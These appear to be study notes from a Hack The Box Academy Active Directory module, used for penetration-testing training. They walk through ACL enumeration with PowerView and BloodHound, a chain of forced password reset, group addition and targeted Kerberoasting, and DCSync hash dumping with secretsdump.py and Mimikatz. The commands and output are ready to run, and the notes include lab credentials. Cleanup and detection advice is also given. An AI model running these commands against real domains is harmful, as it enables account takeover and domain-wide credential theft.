		PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

			Name              : User-Force-Change-Password
			DisplayName       : Reset Password
			DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
			rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529

	> This gave us our answer, but would be highly inefficient during an assessment. PowerView has the ResolveGUIDs flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the ObjectAceType property as User-Force-Change-Password.
	> Using the -ResolveGUIDs Flag
		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

			AceQualifier           : AccessAllowed
			ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
			ActiveDirectoryRights  : ExtendedRight
			ObjectAceType          : User-Force-Change-Password
			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
			InheritanceFlags       : ContainerInherit
			BinaryLength           : 56
			AceType                : AccessAllowedObject
			ObjectAceFlags         : ObjectAceTypePresent
			IsCallback             : False
			PropagationFlags       : None
			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
			AccessMask             : 256
			AuditFlags             : None
			IsInherited            : False
			AceFlags               : ContainerInherit
			InheritedObjectAceType : All
			OpaqueLength           : 0

	> Why did we walk through this example when we could have just searched using ResolveGUIDs first?
	
	> It is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the Get-Acl and Get-ADUser cmdlets which we may find available to us on a client system. Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial and could set us apart from our peers. We may be able to use this knowledge to achieve results when a client has us work from one of their systems, and we are restricted down to what tools are readily available on the system without the ability to pull in any of our own.

	> This example is not very efficient, and the command can take a long time to run, especially in a large environment. It will take much longer than the equivalent command using PowerView. In this command, we've first made a list of all domain users with the following command:
	> Creating a List of Domain Users
		PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

	> We then read each line of the file using a foreach loop, and use the Get-Acl cmdlet to retrieve ACL information for each domain user by feeding each line of the ad_users.txt file to the Get-ADUser cmdlet. We then select just the Access property, which will give us information about access rights. Finally, we set the IdentityReference property to the user we are in control of (or looking to see what rights they have), in our case, wley.
	> A Useful foreach Loop
		PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

			Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
			                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
			ActiveDirectoryRights : ExtendedRight
			InheritanceType       : All
			ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
			InheritedObjectType   : 00000000-0000-0000-0000-000000000000
			ObjectFlags           : ObjectAceTypePresent
			AccessControlType     : Allow
			IdentityReference     : INLANEFREIGHT\wley
			IsInherited           : False
			InheritanceFlags      : ContainerInherit
			PropagationFlags      : None

	> Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

	> So, to recap, we started with the user wley and now have control over the user damundsen via the User-Force-Change-Password extended right. Let's use Powerview to hunt for where, if anywhere, control over the damundsen account could take us.
	> Further Enumeration of Rights Using damundsen
		PS C:\htb> $sid2 = Convert-NameToSid damundsen
		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

			AceType               : AccessAllowed
			ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
			ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
			OpaqueLength          : 0
			ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
			InheritanceFlags      : ContainerInherit
			BinaryLength          : 36
			IsInherited           : False
			IsCallback            : False
			PropagationFlags      : None
			SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
			AccessMask            : 131132
			AuditFlags            : None
			AceFlags              : ContainerInherit
			AceQualifier          : AccessAllowed

	> Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.

	> Let's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the Help Desk Level 1 group is nested into the Information Technology group, meaning that we can obtain any rights that the Information Technology group grants to its members if we just add ourselves to the Help Desk Level 1 group where our user damundsen has GenericWrite privileges.
	> Investigating the Help Desk Level 1 Group with Get-DomainGroup
		PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

			memberof                                                                      
			--------                                                                      
			CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL

	> This is a lot to digest! Let's recap where we're at:

    		- We have control over the user wley whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
    		- We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen
    		- From here, we found that the damundsen user can add a member to the Help Desk Level 1 group using GenericWrite privileges
    		- The Help Desk Level 1 group is nested into the Information Technology group, which grants members of that group any rights provisioned to the Information Technology group

	> Now let's look around and see if members of Information Technology can do anything interesting. Once again, doing our search using Get-DomainObjectACL shows us that members of the Information Technology group have GenericAll rights over the user adunn, which means we could:

    		- Modify group membership
    		- Force change a password
    		- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak

	> Investigating the Information Technology Group
		PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

			AceType               : AccessAllowed
			ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
			ActiveDirectoryRights : GenericAll
			OpaqueLength          : 0
			ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
			InheritanceFlags      : ContainerInherit
			BinaryLength          : 36
			IsInherited           : False
			IsCallback            : False
			PropagationFlags      : None
			SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
			AccessMask            : 983551
			AuditFlags            : None
			AceFlags              : ContainerInherit
			AceQualifier          : AccessAllowed

	> Finally, let's see if the adunn user has any type of interesting access that we may be able to leverage to get closer to our goal.
	> Looking for Interesting Access
		PS C:\htb> $adunnsid = Convert-NameToSid adunn 
		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

			AceQualifier           : AccessAllowed
			ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
			ActiveDirectoryRights  : ExtendedRight
			ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
			InheritanceFlags       : ContainerInherit
			BinaryLength           : 56
			AceType                : AccessAllowedObject
			ObjectAceFlags         : ObjectAceTypePresent
			IsCallback             : False
			PropagationFlags       : None
			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
			AccessMask             : 256
			AuditFlags             : None
			IsInherited            : False
			AceFlags               : ContainerInherit
			InheritedObjectAceType : All
			OpaqueLength           : 0
			
			AceQualifier           : AccessAllowed
			ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
			ActiveDirectoryRights  : ExtendedRight
			ObjectAceType          : DS-Replication-Get-Changes
			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
			InheritanceFlags       : ContainerInherit
			BinaryLength           : 56
			AceType                : AccessAllowedObject
			ObjectAceFlags         : ObjectAceTypePresent
			IsCallback             : False
			PropagationFlags       : None
			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
			AccessMask             : 256
			AuditFlags             : None
			IsInherited            : False
			AceFlags               : ContainerInherit
			InheritedObjectAceType : All
			OpaqueLength           : 0

	> The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section.

* Enumerating ACLs with BloodHound

	> Now that we've enumerated the attack path using more manual methods like PowerView and built-in PowerShell cmdlets, let's look at how much easier this would have been to identify using the extremely powerful BloodHound tool. Let's take the data we gathered earlier with the SharpHound ingestor and upload it to BloodHound. Next, we can set the wley user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under Transitive Object Control. If we click on the 1 next to First Degree Object Control, we see the first set of rights that we enumerated, ForceChangePassword over the damundsen user.
	> Viewing Node Info through BloodHound

	> If we right-click on the line between the two objects, a menu will pop up. If we select Help, we will be presented with help around abusing this ACE, including:

    		- More info on the specific right, tools, and commands that can be used to pull off this attack
    		- Operational Security (Opsec) considerations
    		- External references.

* Investigating ForceChangePassword Further


	> If we click on the 16 next to Transitive Object Control, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.
	> Viewing Potential Attack Paths through BloodHound  => (https://academy.hackthebox.com/storage/modules/143/wley_path.png)
	> Finally, we can use the pre-built queries in BloodHound to confirm that the adunn user has DCSync rights.

* We've now enumerated these attack paths in multiple ways. The next step will be performing this attack chain from start to finish. Let's dig in!

-=-=-=-=

[+] ACL Abuse tactics

* Abusing ACLs

	> Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:
		- Use the wley user to change the password for the damundsen user
    		- Authenticate as the damundsen user and leverage GenericAll rights to add a user that we control to the Help Desk Level 1 group
    		- Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

1. So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.
	> Creating a PSCredential Object
		PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
		PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

	> Next, we must create a SecureString object which represents the password we want to set for the target user damundsen.
	> Creating a SecureString Object
		PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

	> Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password. We need to use the -Credential flag with the credential object we created for the wley user. It's best to always specify the -Verbose flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as pth-net, which is part of the pth-toolkit => (https://github.com/byt3bl33d3r/pth-toolkit)
	> Changing the User's Password
		PS C:\htb> cd C:\Tools\
		PS C:\htb> Import-Module .\PowerView.ps1
		PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
	> We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.
	> Creating a SecureString Object using damundsen
		PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
		PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

	> Next, we can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the pth-toolkit.
	> Adding damundsen to the Help Desk Level 1 Group
		PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
	> Adding damundsen to the Help Desk Level 1 Group
		PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

	> A quick check shows that our addition to the group was successful.
	> Confirming damundsen was Added to the Group
		PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

	> At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.
	> We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast(https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
	> Creating a Fake SPN
		PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

	> If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.
	> Kerberoasting with Rubeus
		PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

	> Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack, which we will cover in the next section.

* Cleanup

	> In terms of cleanup, there are a few things we need to do:

    		- Remove the fake SPN we created on the adunn user.
    		- Remove the damundsen user from the Help Desk Level 1 group
    		- Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user

	> This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.
	> First, let's remove the fake SPN from the adunn account.
	> Removing the Fake SPN from adunn's Account
		PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

	> Next, we'll remove the user from the group using the Remove-DomainGroupMember function.
	> Removing damundsen from the Help Desk Level 1 Group
		PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose


	> We can confirm the user was indeed removed:
	> Confirming damundsen was Removed from the Group
		PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose

	> Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report. Our client will want to be apprised of any changes within the environment, and recording everything we do during an assessment in writing helps our client and us should questions arise.
	> This is just one example attack path. There could be many attack paths in a large domain, some shorter and some more complicated. While this path was fictional for this specific lab environment, I have seen similar attack paths during real-world engagements, and ACL attacks often come into play for furthering access. Sometimes, though, an ACL attack chain may be too time-consuming or potentially destructive, so we may prefer to enumerate the path to present our client with enough evidence to understand the issue and perform remediation.

* Detection and Remediation
! A few recommendations around ACLs include:
	> Auditing for and removing dangerous ACLs
		- Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.
	> Monitor group membership
		- Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.
	> Audit and monitor for ACL changes
		- Enabling the Advanced Security Audit Policy can help in detecting unwanted changes, especially Event ID 5136: A directory service object was modified which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID 5136 created:
	> Viewing Event ID 5136
	> If we check out the Details tab, we can see that the pertinent information is written in Security Descriptor Definition Language (SDDL) which is not human readable.
	> Viewing Associated SDDL (Details => Friendly View => AttributeValue)

	> We can use the ConvertFrom-SddlString cmdlet to convert this to a readable format.
	> Converting the SDDL String into a Readable Format
		PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC...."

	> If we choose to filter on the DiscretionaryAcl property, we can see that the modification was likely giving the mrb3n user GenericWrite privileges over the domain object itself, which could be indicative of an attack attempt.
	> Converting the SDDL String into a Readable Format

			PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:A... [SNIP]" | select -ExpandProperty DiscretionaryAcl

	> There are many tools out there that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools such as the various ways we can monitor for and alert on events in Active Directory, can help to detect these types of attacks and prevent them from going any further.
	> In the next section, we'll walk through the DCSync attack, which is the result of the attack path we just worked through and is a common way to achieve domain compromise.


[+] DCSync

	> Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.

* Scenario Setup

	> In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (secretsdump.py) you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!. This could also likely be done all from Windows using a version of secretsdump.exe compiled for Windows as there are several GitHub repos of the Impacket toolkit compiled for Windows, or you can do that as a side challenge.
	> What is DCSync and How Does it Work?

		- DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
		- The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.
		- To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
	> Viewing adunn's Replication Privileges through ADSI Edit
		(https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)
		ADSI Edit => Security => Permissions for Angela Dunn

	> It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:
	> Using Get-DomainUser to View adunn's Group Membership
		PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

	> PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object ("DC=inlanefreight,DC=local") using Get-ObjectAcl to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user adunn (denoted in the below command as $sid) possesses these rights. The command confirms that the user does indeed have the rights.
	> Using Get-ObjectAcl to Check adunn's Replication Rights
		PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
		PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl


	> If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.

	> Running the tool as below will write all hashes to files with the prefix inlanefreight_hashes. The -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
	> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
		m1l0js@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 


	> We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

    		- Number and % of passwords cracked
    		- top 10 passwords
    		- Password length metrics
    		- Password re-use

	> Reflect only active user accounts in the domain.

	> If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.
	> Listing Hashes, Kerberos Keys, and Cleartext Passwords
		m1l0js@htb[/htb]$ ls inlanefreight_hashes*

		inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos

	> While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.
	> Viewing an Account with Reversible Encryption Password Storage Set
		(https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)
		Account ==> Account options ==> Store password using reversible encryption

image

	> When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey => https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview) and can be extracted by a Domain Admin or equivalent. Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the Get-ADUser cmdlet:
	> Enumerating Further using Get-ADUser
		PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

			DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
			Enabled            : True
			GivenName          :
			Name               : PROXYAGENT
			ObjectClass        : user
			ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
			SamAccountName     : proxyagent
			SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
			Surname            :
			userAccountControl : 640
			UserPrincipalName  :

	> We can see that one account, proxyagent, has the reversible encryption option set with PowerView as well:
	> Checking for Reversible Encryption Option using Get-DomainUser
		PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

		samaccountname                         useraccountcontrol
		--------------                         ------------------
		proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
		syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

	> We will notice the tool decrypted the password and provided us with the cleartext value.
	> Displaying the Decrypted Password
		m1l0js@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
		proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!

	> I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.

	> We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the krbtgt account and use this to create a Golden Ticket for persistence, but that is outside the scope of this module.
	> Performing the Attack with Mimikatz
		PS C:\htb> .\mimikatz.exe
		mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

* In the next section, we'll see some ways to enumerate and take advantage of remote access rights that may be granted to a user we control. These methods include Remote Desktop Protocol (RDP), WinRM (or PsRemoting), and SQL Server admin access.

-=-=-=-=-=-=
[+] Privileged Access 

	> Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.
	> But what if we don't yet have local admin rights on any hosts in the domain?
	> There are several other ways we can move around a Windows domain:
	     	- Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host
	     	- PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
	     	- MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods
	> We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
		- CanRDP
	     	- CanPSRemote
	     	- SQLAdmin
	> We can also enumerate these privileges using tools such as PowerView and even built-in tools.

* Scenario Setup
	> In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (mssqlclient.py and evil-winrm) you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!. We recommend that you try all methods shown in this section (i.e., Enter-PSSession and PowerUpSQL from the Windows attack host and evil-winrm and mssqlclient.py from the Linux attack host).

* Remote Desktop

	> Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:
	     	- Launch further attacks
	     	- We may be able to escalate privileges and obtain credentials for a higher privileged user
	> Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host. Let's check out the Remote Desktop Users group on the MS01 host in our target domain.
	> Enumerating the Remote Desktop Users Group
		PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
	 	ComputerName : ACADEMY-EA-MS01
	 	GroupName    : Remote Desktop Users
	 	MemberName   : INLANEFREIGHT\Domain Users
	 	SID          : S-1-5-21-3842939050-3880317879-2865463114-513
	 	IsGroup      : True
	 	IsDomain     : UNKNOWN
	> From the information above, we can see that all Domain Users (meaning all users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing I check after importing BloodHound data is:
	> Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
	> Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
		(https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)
	> If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.
	> We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period. This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.
	> To test this access, we can either use a tool such as xfreerdp or Remmina from our VM or the Pwnbox or mstsc.exe if attacking from a Windows host.

* WinRM

	> Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.
	> Enumerating the Remote Management Users Group
		PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
		
		ComputerName : ACADEMY-EA-MS01
		GroupName    : Remote Management Users
		MemberName   : INLANEFREIGHT\forend
		SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
		IsGroup      : False
		IsDomain     : UNKNOWN

	> We can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.
		MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

	> We could also add this as a custom query to our BloodHound installation, so it's always available to us.
	> We can use the Enter-PSSession cmdlet using PowerShell from a Windows host.
	> Establishing WinRM Session from Windows

		PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
		PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
		PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

			[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
			ACADEMY-EA-DB01
			[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
			PS C:\htb> 

	> From our Linux attack host, we can use the tool evil-winrm to connect.
	> To use evil-winrm we can install it using the following command:
	> Installing Evil-WinRM
		m1l0js@htb[/htb]$ gem install evil-winrm

	> We can connect with just an IP address and valid credentials.
	> Connecting to a Target with Evil-WinRM and Valid Credentials
